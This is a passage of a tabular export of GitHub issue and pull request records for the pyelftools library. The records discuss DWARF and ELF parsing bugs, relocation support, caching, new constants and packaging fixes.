Does that make sense?",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/270/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/270/comments,https://api.github.com/repos/eliben/pyelftools/issues/270/events,https://github.com/eliben/pyelftools/issues/270,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/269,556815195,MDExOlB1bGxSZXF1ZXN0MzY4NTE3NjMz,269,Cache machine_arch in order to speed up _do_apply_relocation(),662616,closed,FALSE,NA,NA,1,2020-01-29T11:56:41Z,2020-01-29T18:12:25Z,2020-01-29T18:12:25Z,CONTRIBUTOR,NA,"When loading linux kernel debug info under pypy3, according to
cProfile, get_machine_arch() calls from _do_apply_relocation()
constitute 30% of the run time. Avoid unnecessary calls by caching the
return value in the new RelocationHandler.machine_arch field.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/269/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/269/comments,https://api.github.com/repos/eliben/pyelftools/issues/269/events,https://github.com/eliben/pyelftools/pull/269,https://api.github.com/repos/eliben/pyelftools/pulls/269
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/268,555766090,MDExOlB1bGxSZXF1ZXN0MzY3NjQ4NDYw,268,"for sibling of form ref_addr, only sibling value should be used",1609559,closed,FALSE,1609559,NA,19,2020-01-27T18:54:39Z,2020-07-08T00:16:33Z,2020-07-08T00:10:07Z,CONTRIBUTOR,NA,"Hi, 

cur_offset  calculation might be wrong if the sibling is DW_FORM_ref_addr, because it holds an reference from the beginning of the .debug_info.

>     This type of reference (DW_FORM_ref_addr) is an offset from the
>     beginning of the .debug_info section of the target executable or
>     shared object file, or, for references within a supplementary object file,
>     an offset from the beginning of the local .debug_info section;

this fix is related to : 
https://github.com/eliben/pyelftools/commit/670079afe5a472aab74cec74acc15ae7c50cdb83#r36974522",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/268/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/268/comments,https://api.github.com/repos/eliben/pyelftools/issues/268/events,https://github.com/eliben/pyelftools/pull/268,https://api.github.com/repos/eliben/pyelftools/pulls/268
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/267,555741710,MDExOlB1bGxSZXF1ZXN0MzY3NjI4NDQ2,267,Feature expressions,5807738,closed,FALSE,NA,NA,1,2020-01-27T18:05:39Z,2020-02-08T01:01:45Z,2020-01-31T21:14:00Z,CONTRIBUTOR,NA,"Support for several DWARF opcodes that occur in the wild.

The way DWARF expressions work, unknown opcodes throw off the parser completely, since the structure of the arguments can't be derived from any outside metadata. Had to fix that.

DW_OP_GNU_entry_value introduces the concept of nested expressions - an expression blob as an argument of an opcode. The visitor pattern is a poor fit for that, so I've introduced the GenericExprDumper - a generic expression to command list converter, with a hook for derived classes to provide a single operation formatter function. Nested expressions fit more naturally into that.

Feel free to redo or throw away the DIE.resolve_reference(). It was a quick and dirty fix.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/267/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/267/comments,https://api.github.com/repos/eliben/pyelftools/issues/267/events,https://github.com/eliben/pyelftools/pull/267,https://api.github.com/repos/eliben/pyelftools/pulls/267
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/266,555373340,MDExOlB1bGxSZXF1ZXN0MzY3MzI2MTQ0,266,Make sure ELFFile.has_dwarf_info() returns a Boolean.,5071575,closed,FALSE,NA,NA,0,2020-01-27T06:05:25Z,2020-02-04T14:47:30Z,2020-02-04T13:32:31Z,CONTRIBUTOR,NA,The current implementation of has_dwarf_info() will make it return a Section object if a binary does have one of the sections that are checked. This PR makes it return a Boolean instead.,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/266/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/266/comments,https://api.github.com/repos/eliben/pyelftools/issues/266/events,https://github.com/eliben/pyelftools/pull/266,https://api.github.com/repos/eliben/pyelftools/pulls/266
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/265,553906282,MDExOlB1bGxSZXF1ZXN0MzY2MTU1MjA2,265,dwarf .debug_types and .debug_macros,16150300,open,FALSE,NA,NA,8,2020-01-23T02:40:41Z,2020-05-23T14:50:21Z,NA,CONTRIBUTOR,NA,"Here is a series that adds .debug_types with an api similar to random-die, and also a .debug_macros with an API based on location lists.

Both have readelf based testing, including a new assembly generated dwarf for some macinfo corners.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/265/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/265/comments,https://api.github.com/repos/eliben/pyelftools/issues/265/events,https://github.com/eliben/pyelftools/pull/265,https://api.github.com/repos/eliben/pyelftools/pulls/265
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/264,553889520,MDExOlB1bGxSZXF1ZXN0MzY2MTQxODQ5,264,Cached random access to CUs and DIEs,16150300,closed,FALSE,16150300,NA,14,2020-01-23T01:30:51Z,2020-04-22T12:57:33Z,2020-04-22T12:57:33Z,CONTRIBUTOR,NA,"Here is a series that refactors the DIE cache to cache entries without walking from the top of a CU,
and also one that adds a similar cache to the CU lookup in the DWARFInfo.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/264/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/264/comments,https://api.github.com/repos/eliben/pyelftools/issues/264/events,https://github.com/eliben/pyelftools/pull/264,https://api.github.com/repos/eliben/pyelftools/pulls/264
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/263,552538480,MDU6SXNzdWU1NTI1Mzg0ODA=,263,section_in_segment() logic contradicts comment,14355564,closed,FALSE,NA,NA,1,2020-01-20T22:42:05Z,2020-02-04T13:30:09Z,2020-02-04T13:30:09Z,NONE,NA,"I don't really understand the elf internals, but I was having an issue with a section not showing up in my elffile, and I tracked it down to this section of code:

https://github.com/eliben/pyelftools/blob/a347dbfab622ab98d9747d862ade9e6b6fd9425c/elftools/elf/segments.py#L43-L47

Assuming the logic of the comment is correct, then I think it should be  ""segtype **not** in ('PT_TLS', 'PT_GNU_RELR0', 'PT_LOAD')""",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/263/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/263/comments,https://api.github.com/repos/eliben/pyelftools/issues/263/events,https://github.com/eliben/pyelftools/issues/263,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/262,548605737,MDU6SXNzdWU1NDg2MDU3Mzc=,262,API for cache friendly DIE reference chasing,5807738,open,FALSE,NA,NA,0,2020-01-12T18:09:27Z,2020-01-12T18:09:27Z,NA,CONTRIBUTOR,NA,"DIEs often contain references to other DIEs. For example, DW_TAG_formal_parameter contains DW_AT_type, which is usually a DW_FORM_refX and contains an offset to another DIE within the same CU. Several other reference formats are possible.

The straightforward way to resolve the reference in that form goes:

    attr = param_DIE.attributes['DW_AT_type']
    if attr.form in ('DW_FORM_ref1', 'DW_FORM_ref2', 'DW_FORM_ref4', 'DW_FORM_ref8'):
            CU = param_DIE.cu
            type_DIE = DIE(cu=CU, stream=param_DIE.stream, offset=CU.cu_offset + attr.value)

But that ignores the DIE caching logic in the CompileUnit class. Not good.

For a business case, look no further than binutils' addr2line. The original utility outputs the demangled name of C++ functions. That involves parsing a function spec, which involves listing parameters and resolving their datatypes.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/262/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/262/comments,https://api.github.com/repos/eliben/pyelftools/issues/262/events,https://github.com/eliben/pyelftools/issues/262,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/261,548170130,MDU6SXNzdWU1NDgxNzAxMzA=,261,"Fixed some gaps, but the test files are not for publishing",5807738,closed,FALSE,NA,NA,2,2020-01-10T16:23:09Z,2020-02-04T14:15:26Z,2020-02-04T14:15:26Z,CONTRIBUTOR,NA,"I've been using elftools to parse DWARF information in a certain Android codebase. Found some gaps in functionality (unsupported expression opcodes), fixed them in my fork. I wanted to submit a pull request for the fixes. There is a unit test for the fixes, but the SO files it works against are not to be published on Github. Advice?



",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/261/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/261/comments,https://api.github.com/repos/eliben/pyelftools/issues/261/events,https://github.com/eliben/pyelftools/issues/261,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/260,538994992,MDU6SXNzdWU1Mzg5OTQ5OTI=,260,test/testfiles_for_unittests/empty_pubtypes/ directory missing from 0.26 tarball,5873507,closed,FALSE,NA,NA,0,2019-12-17T11:04:17Z,2020-02-04T14:22:00Z,2020-02-04T14:22:00Z,NONE,NA,"`test/testfiles_for_unittests/empty_pubtypes/` is missing from 0.26 [release tarball on pythonhosted.org](https://files.pythonhosted.org/packages/source/p/pyelftools/pyelftools-0.26.tar.gz). It seems to be there on github releases tab, though.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/260/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/260/comments,https://api.github.com/repos/eliben/pyelftools/issues/260/events,https://github.com/eliben/pyelftools/issues/260,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/259,537900253,MDExOlB1bGxSZXF1ZXN0MzUzMTY1Nzkx,259,Fix simple typo: wether -> whether,47873678,closed,FALSE,NA,NA,0,2019-12-14T11:09:49Z,2019-12-16T13:23:11Z,2019-12-16T13:23:10Z,CONTRIBUTOR,NA,"Closes #258

",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/259/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/259/comments,https://api.github.com/repos/eliben/pyelftools/issues/259/events,https://github.com/eliben/pyelftools/pull/259,https://api.github.com/repos/eliben/pyelftools/pulls/259
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/258,537900223,MDU6SXNzdWU1Mzc5MDAyMjM=,258,Fix simple typo: wether -> whether,47873678,closed,FALSE,NA,NA,0,2019-12-14T11:09:39Z,2019-12-16T13:23:10Z,2019-12-16T13:23:10Z,CONTRIBUTOR,NA,"There is a small typo in scripts/readelf.py.
Should read `whether` rather than `wether`.

",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/258/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/258/comments,https://api.github.com/repos/eliben/pyelftools/issues/258/events,https://github.com/eliben/pyelftools/issues/258,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/257,536070803,MDU6SXNzdWU1MzYwNzA4MDM=,257,"Access enums as enums, not strings?",32394,open,FALSE,NA,NA,1,2019-12-11T00:27:22Z,2020-02-04T14:22:36Z,NA,NONE,NA,"It would be nice if enums such as E_MACHINE were exposed as Python `enum.Enum`  instead of strings?

```
>>> elf = elftools.elf.elffile.ELFFile(open(""/usr/bin/find"", ""rb""))
>>> elf.header.e_machine
'EM_X86_64'
>>> type(elf.header.e_machine)
<class 'str'>
```

https://docs.python.org/3/library/enum.html

Yes, this means Python 3.4 onwards only.  Considering at the time of writing Python 2 is EOL in 20 days, is this still an issue?",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/257/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/257/comments,https://api.github.com/repos/eliben/pyelftools/issues/257/events,https://github.com/eliben/pyelftools/issues/257,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/256,534761079,MDU6SXNzdWU1MzQ3NjEwNzk=,256,release 0.26 tag and tarball missing,5873507,closed,FALSE,NA,NA,1,2019-12-09T08:09:51Z,2019-12-09T13:23:43Z,2019-12-09T13:23:43Z,NONE,NA,0.26 was released on pypi as a binary wheel only. There's no corresponding source tarball either on pypi or github. Please provide one.,NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/256/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/256/comments,https://api.github.com/repos/eliben/pyelftools/issues/256/events,https://github.com/eliben/pyelftools/issues/256,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/255,533121778,MDU6SXNzdWU1MzMxMjE3Nzg=,255,Does pyelftools support parallelism,19629185,closed,FALSE,NA,NA,5,2019-12-05T04:47:54Z,2019-12-09T13:26:54Z,2019-12-09T13:26:54Z,NONE,NA,"I have a ELF file with about 1300 CUs in it. I want to pull specific information about the dies in each CU into a db. If I just iterate through the CUs, it takes about 6 hours to process everything.

Is it possible to split this processing into x number of threads to try to speed up the process? I assume there would be no issue as all threads would just be reading from the ELF file, correct? Is there some internal mechanism in pyelftools that would prevent me from processing in multiple threads?

My workflow is as follow:

Driver:
1) Create n worker threads
2) start n worker threads
3) wait for all worker threads to finish

Worker:
1) open elf file
2) get dwarf info
3) iterate through CUs and only process every nth CU

Doing this now is not speeding up processing like I would have thought it would so I'm wondering if there is anything in pyelftools that prevents me from parallelizing this? ",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/255/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/255/comments,https://api.github.com/repos/eliben/pyelftools/issues/255/events,https://github.com/eliben/pyelftools/issues/255,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/254,532777314,MDU6SXNzdWU1MzI3NzczMTQ=,254,can i get structure member name and address using this tool?,7553566,closed,FALSE,NA,NA,0,2019-12-04T15:58:12Z,2019-12-18T15:05:35Z,2019-12-18T15:05:35Z,NONE,NA,"i want to get the structure member name and address, for example
```c
typedef struct node1{
  uint32_t value;
} Node_t1;

typedef struct node2{
  uint32_t id;
  Node_t1 t1;
} Node_t2;

Node_t2 node_t2;
```
the results i want to get as below
```
node_t2.id   address1
node_t2.t1.value   address2
```
can someone show me an example?",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/254/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/254/comments,https://api.github.com/repos/eliben/pyelftools/issues/254/events,https://github.com/eliben/pyelftools/issues/254,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/253,529431664,MDExOlB1bGxSZXF1ZXN0MzQ2MzA5OTc5,253,Basic relocation support added for AArch64 architecture,17182552,open,FALSE,NA,NA,0,2019-11-27T15:50:45Z,2019-12-05T13:45:48Z,NA,NONE,NA,"The implementation is mostly based on how the script handles the ARM architecture, however AArch64 may use REL and RELA as well. For the relocation codes and their specification [this](https://static.docs.arm.com/ihi0056/b/IHI0056B_aaelf64.pdf) documentation was used.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/253/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/253/comments,https://api.github.com/repos/eliben/pyelftools/issues/253/events,https://github.com/eliben/pyelftools/pull/253,https://api.github.com/repos/eliben/pyelftools/pulls/253
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/252,528804479,MDExOlB1bGxSZXF1ZXN0MzQ1Nzk4NDE5,252,Update die.py,20299351,closed,FALSE,NA,NA,1,2019-11-26T15:36:43Z,2019-12-05T13:16:35Z,2019-12-05T13:16:35Z,NONE,NA,"translate ""ref"" values",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/252/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/252/comments,https://api.github.com/repos/eliben/pyelftools/issues/252/events,https://github.com/eliben/pyelftools/pull/252,https://api.github.com/repos/eliben/pyelftools/pulls/252
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/251,528095320,MDU6SXNzdWU1MjgwOTUzMjA=,251,DeprecationWarning in elftools/construct/lib/container.py:5,29819710,closed,FALSE,NA,NA,6,2019-11-25T13:41:53Z,2019-12-05T16:52:35Z,2019-12-02T13:25:12Z,NONE,NA,"Hitting the following warning using `pyelftools==0.25`
```
/tmp/pyenv/lib/python3.7/site-packages/elftools/construct/lib/container.py:5: 
DeprecationWarning: Using or importing the ABCs from 'collections' instead of 
from 'collections.abc' is deprecated since Python 3.3, and in 3.9 it will stop working
  from collections import MutableMapping
```",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/251/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/251/comments,https://api.github.com/repos/eliben/pyelftools/issues/251/events,https://github.com/eliben/pyelftools/issues/251,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/250,524082383,MDU6SXNzdWU1MjQwODIzODM=,250,How to get the full file path from DW_AT_decl_file,19629185,closed,FALSE,NA,NA,2,2019-11-18T01:11:41Z,2019-11-18T20:12:54Z,2019-11-18T20:12:54Z,NONE,NA,I can't seem to figure this out. I know the DW_AT_decl_file is 1 which I need to lookup in some array but I can't find where that array is. I can get the file name from the line program header but I can't find the full path. I know it exists somewhere in the ELF file since dwarfdump shows the full file path. How do I get this info in pyelftools?,NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/250/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/250/comments,https://api.github.com/repos/eliben/pyelftools/issues/250/events,https://github.com/eliben/pyelftools/issues/250,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/249,514943526,MDExOlB1bGxSZXF1ZXN0MzM0NDgzOTU3,249,Lazy DIE parsing,3059210,closed,FALSE,NA,NA,8,2019-10-30T19:56:45Z,2019-12-13T20:38:06Z,2019-11-08T03:07:29Z,CONTRIBUTOR,NA,Supersedes/closes #216.,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/249/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/249/comments,https://api.github.com/repos/eliben/pyelftools/issues/249/events,https://github.com/eliben/pyelftools/pull/249,https://api.github.com/repos/eliben/pyelftools/pulls/249
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/248,511466105,MDExOlB1bGxSZXF1ZXN0MzMxNjU4MzQ3,248,elf/constants: Add SHN_XINDEX,3059210,closed,FALSE,NA,NA,0,2019-10-23T17:24:14Z,2021-04-15T05:03:32Z,2019-10-27T13:10:49Z,CONTRIBUTOR,NA,"`SHN_XINDEX` has the same value as `SHN_HIRESERVE` and is used as a sentinel for section indices that are too large to fit in the section header table. Their interpretation is section-dependent.

Reference:
* https://docs.oracle.com/cd/E19683-01/817-3677/chapter6-94076/index.html",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/248/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/248/comments,https://api.github.com/repos/eliben/pyelftools/issues/248/events,https://github.com/eliben/pyelftools/pull/248,https://api.github.com/repos/eliben/pyelftools/pulls/248
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/247,509635982,MDExOlB1bGxSZXF1ZXN0MzMwMTQ1OTYy,247,Include README.rst instead of README in manifest,1046379,closed,FALSE,NA,NA,0,2019-10-20T18:55:19Z,2019-10-21T12:18:45Z,2019-10-21T12:18:45Z,CONTRIBUTOR,NA,`setup.py bdist_wheel` warns about not finding README.,NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/247/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/247/comments,https://api.github.com/repos/eliben/pyelftools/issues/247/events,https://github.com/eliben/pyelftools/pull/247,https://api.github.com/repos/eliben/pyelftools/pulls/247
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/246,507485876,MDExOlB1bGxSZXF1ZXN0MzI4NDY3OTIx,246,dwarf/die: Handle DW_FORM_flag_present in value translation,3059210,closed,FALSE,NA,NA,6,2019-10-15T21:12:36Z,2019-10-18T21:21:09Z,2019-10-18T16:17:28Z,CONTRIBUTOR,NA,"When an attribute has form DW_FORM_flag_present it is implicitly
indicated as present, with no actual value.

Ref. DWARFv4, section 7:

> A flag is represented explicitly as a single byte of data (DW_FORM_flag) or implicitly
(DW_FORM_flag_present). In the first case, if the flag has value zero, it indicates the
absence of the attribute; if the flag has a non-zero value, it indicates the presence of the
attribute. In the second case, the attribute is implicitly indicated as present, and no value is
encoded in the debugging information entry itself. ",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/246/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/246/comments,https://api.github.com/repos/eliben/pyelftools/issues/246/events,https://github.com/eliben/pyelftools/pull/246,https://api.github.com/repos/eliben/pyelftools/pulls/246
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/245,502847589,MDExOlB1bGxSZXF1ZXN0MzI0ODUyNDgx,245,"dwarf/constants: More DW_LANG, DW_ATE constants",3059210,closed,FALSE,NA,NA,1,2019-10-04T21:15:11Z,2019-10-05T12:53:38Z,2019-10-04T22:24:47Z,CONTRIBUTOR,NA,"Most of these were added in DWARFv5.

Reference:

* https://github.com/llvm-mirror/llvm/blob/master/include/llvm/BinaryFormat/Dwarf.def",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/245/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/245/comments,https://api.github.com/repos/eliben/pyelftools/issues/245/events,https://github.com/eliben/pyelftools/pull/245,https://api.github.com/repos/eliben/pyelftools/pulls/245
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/244,502386264,MDExOlB1bGxSZXF1ZXN0MzI0NDc5MDcy,244,"dwarf/enums: More attributes, tags, and forms",3059210,closed,FALSE,NA,NA,1,2019-10-04T02:08:32Z,2019-10-04T13:35:59Z,2019-10-04T13:06:05Z,CONTRIBUTOR,NA,"Another medley of enum additions, sourced from DWARFv5 changes as well as vendor-specific values.

Sources:

* https://sourceware.org/elfutils/DwarfExtensions
* https://github.com/llvm-mirror/llvm/blob/master/include/llvm/BinaryFormat/Dwarf.def",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/244/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/244/comments,https://api.github.com/repos/eliben/pyelftools/issues/244/events,https://github.com/eliben/pyelftools/pull/244,https://api.github.com/repos/eliben/pyelftools/pulls/244
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/243,502212026,MDU6SXNzdWU1MDIyMTIwMjY=,243,Customize the ELF and Write it ?,17165298,closed,FALSE,NA,NA,2,2019-10-03T17:59:28Z,2019-10-04T08:34:01Z,2019-10-04T02:26:49Z,NONE,NA,"Hi there!

I just wanted to ask,

Is it possible to customize bits and bytes of the ELF file and then produce an altered - change version of it ?

Thanks in advance.",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/243/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/243/comments,https://api.github.com/repos/eliben/pyelftools/issues/243/events,https://github.com/eliben/pyelftools/issues/243,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/242,501098971,MDExOlB1bGxSZXF1ZXN0MzIzNDM3OTkw,242,dwarf/enums Add GNU parameter tags,3059210,closed,FALSE,NA,NA,1,2019-10-01T19:28:09Z,2019-10-03T14:53:20Z,2019-10-03T14:13:39Z,CONTRIBUTOR,NA,"Adds `DW_TAG_GNU_template_template_param`, `DW_TAG_GNU_template_parameter_pack`, and `DW_TAG_GNU_formal_parameter_pack`, which both GCC and Clang emit to help identify template template parameters and variadic template/formal parameters.

`DW_TAG_GNU_template_parameter_pack` and `DW_TAG_GNU_formal_parameter_pack` were slated for DWARFv5 according to [this](http://wiki.dwarfstd.org/index.php?title=C%2B%2B0x:_Variadic_templates), but it looks like work has stalled and the vendor-prefixed names/opcodes remain in use.

Also reformats the table to fit the new tag names.",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/242/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/242/comments,https://api.github.com/repos/eliben/pyelftools/issues/242/events,https://github.com/eliben/pyelftools/pull/242,https://api.github.com/repos/eliben/pyelftools/pulls/242
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/241,496761277,MDU6SXNzdWU0OTY3NjEyNzc=,241,DW_AT_specification for DW_TAG_variable has the same value for all offsets,1609559,closed,FALSE,NA,NA,4,2019-09-22T10:42:13Z,2020-02-05T19:51:31Z,2020-02-05T19:51:30Z,CONTRIBUTOR,NA,"I have the following simple code, I have 4 compilation units : func1.c, func2.c, func3.c, main.c
func1.c : 
```
extern int result1;
int result1 = 1;
```

func2,c : 
```
extern int result2;
int result2 = 2;
```

func3.c : 
```
extern int result3;
int result3 = 3;
```
main.c
```
extern int result1;
extern int result2;
extern int result3;

int main()
{
    return result1 + result2 + result3;
}
```

using readelf, from binutils, for dumping some dwarf info I get the following for each result* variable : 
```
 <1><21>: Abbrev Number: 2 (DW_TAG_variable)
    <22>   DW_AT_name        : (indirect string, offset: 0x213e): result1
    <26>   DW_AT_decl_file   : 1
    <27>   DW_AT_decl_line   : 1
    <28>   DW_AT_type        : <0x2c>
    <2c>   DW_AT_external    : 1
    <2c>   DW_AT_declaration : 1
 <1><2c>: Abbrev Number: 3 (DW_TAG_base_type)
    <2d>   DW_AT_byte_size   : 4
    <2e>   DW_AT_encoding    : 5        (signed)
    <2f>   DW_AT_name        : int
 <1><33>: Abbrev Number: 4 (DW_TAG_variable)
    <34>   DW_AT_specification: <0x21>
    <38>   DW_AT_decl_line   : 3
    <39>   DW_AT_location    : 9 byte block: 3 10 10 20 0 0 0 0 0       (DW_OP_addr: 201010)
...
 <1><65>: Abbrev Number: 2 (DW_TAG_variable)
    <66>   DW_AT_name        : (indirect string, offset: 0x268c): result2
    <6a>   DW_AT_decl_file   : 1
    <6b>   DW_AT_decl_line   : 1
    <6c>   DW_AT_type        : <0x70>
    <70>   DW_AT_external    : 1
    <70>   DW_AT_declaration : 1
 <1><70>: Abbrev Number: 3 (DW_TAG_base_type)
    <71>   DW_AT_byte_size   : 4
    <72>   DW_AT_encoding    : 5        (signed)
    <73>   DW_AT_name        : int
 <1><77>: Abbrev Number: 4 (DW_TAG_variable)
    <78>   DW_AT_specification: <0x65>
    <7c>   DW_AT_decl_line   : 3
    <7d>   DW_AT_location    : 9 byte block: 3 14 10 20 0 0 0 0 0       (DW_OP_addr: 201014)
...
 <1><a9>: Abbrev Number: 2 (DW_TAG_variable)
    <aa>   DW_AT_name        : (indirect string, offset: 0x269c): result3
    <ae>   DW_AT_decl_file   : 1
    <af>   DW_AT_decl_line   : 1
    <b0>   DW_AT_type        : <0xb4>
    <b4>   DW_AT_external    : 1
    <b4>   DW_AT_declaration : 1
 <1><b4>: Abbrev Number: 3 (DW_TAG_base_type)
    <b5>   DW_AT_byte_size   : 4
    <b6>   DW_AT_encoding    : 5        (signed)
    <b7>   DW_AT_name        : int
 <1><bb>: Abbrev Number: 4 (DW_TAG_variable)
    <bc>   DW_AT_specification: <0xa9>
    <c0>   DW_AT_decl_line   : 3
    <c1>   DW_AT_location    : 9 byte block: 3 18 10 20 0 0 0 0 0       (DW_OP_addr: 201018)
``` 

The value of _DW_AT_specification_ for each variable points to the corresponding DIE offset
but when using pyelftools example code _dwarf_location_info.py_ DW_AT_specification value is the same for all 3 tags (I added a print statement to print DW_AT_specification attribute) : 
```

Processing file: ./a.out
  Found a compile unit at offset 0, length 64
   DIE DW_TAG_variable. attr DW_AT_location.
AttributeValue(name='DW_AT_specification', form='DW_FORM_ref4', value=33, raw_value=33, offset=52)
      (DW_OP_addr: 201010)
  Found a compile unit at offset 68, length 64
   DIE DW_TAG_variable. attr DW_AT_location.
AttributeValue(name='DW_AT_specification', form='DW_FORM_ref4', value=33, raw_value=33, offset=120)
      (DW_OP_addr: 201014)
  Found a compile unit at offset 136, length 64
   DIE DW_TAG_variable. attr DW_AT_location.
AttributeValue(name='DW_AT_specification', form='DW_FORM_ref4', value=33, raw_value=33, offset=188)
      (DW_OP_addr: 201018)
  Found a compile unit at offset 204, length 115
   DIE DW_TAG_subprogram. attr DW_AT_frame_base.
      (DW_OP_call_frame_cfa)
```
The value for each offset is 33 when the real values are 33, 101, 169",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/241/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/241/comments,https://api.github.com/repos/eliben/pyelftools/issues/241/events,https://github.com/eliben/pyelftools/issues/241,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/240,494355885,MDExOlB1bGxSZXF1ZXN0MzE4MTI1MTI5,240,dwarf_expr: Add DWARFv5 OPs,3059210,closed,FALSE,NA,NA,1,2019-09-17T01:40:57Z,2019-09-18T03:32:45Z,2019-09-17T12:17:56Z,CONTRIBUTOR,NA,"Adds more `DW_OP_*` constants added in version 5 of the DWARF spec.

